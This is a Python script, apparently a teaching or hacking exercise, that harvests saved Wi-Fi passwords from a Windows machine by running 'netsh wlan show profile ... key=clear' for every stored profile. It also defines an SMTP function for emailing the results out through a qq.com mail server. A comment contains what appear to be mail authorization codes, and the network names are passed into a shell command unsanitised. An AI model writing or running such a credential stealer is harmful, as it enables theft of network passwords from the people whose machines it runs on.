#!/usr/bin/env python
# coding=utf-8

import subprocess
import smtplib
import re

def send_mail(email, password, message):
    # google: smtp.gmail.com, port 587
    server = smtplib.SMTP_SSL("smtp.qq.com", 465)

    # TLS connection
    # server.starttls()
    
    # need to open POP3/SMTP service: xhtzxhzgydvpbedd; IMAP/SMTP: ltuboefioyepbbdc
    server.login(email, password)
    server.sendmail(from_addr=email, to_addrs=email, msg=message.encode("gb2312"))
    server.quit()
    print("[+] Mail sent.")

def get_networks():
    # 32-bit Windows: %SystemRoot%\System32\msg.exe
    # 64-bit Windows: msg for 64-bit python, %SystemRoot%\Sysnative\msg.exe for 32-bit python
    # command = "msg * you have been hacked"

    # netsh wlan show profile [wifi-name] [key=clear]
    command = "netsh wlan show profile"

    # Popen --> do not wait until the command is finished
    networks = subprocess.check_output(command, shell=True)
    # re.search --> the first matched one, findall --> all
    network_names_list = re.findall(u"(?:配置文件\s*:\s)(.*)", networks.decode("gb2312", "ignore"))
    return network_names_list

def get_net_info(networks_list):
    result = ""
    for network in networks_list:
        command = "netsh wlan show profile " + network + " key=clear"
        current_result = subprocess.check_output(command, shell=True)
        result += current_result.decode("gb2312")
    return result

networks_list = get_networks()
result = get_net_info(networks_list)
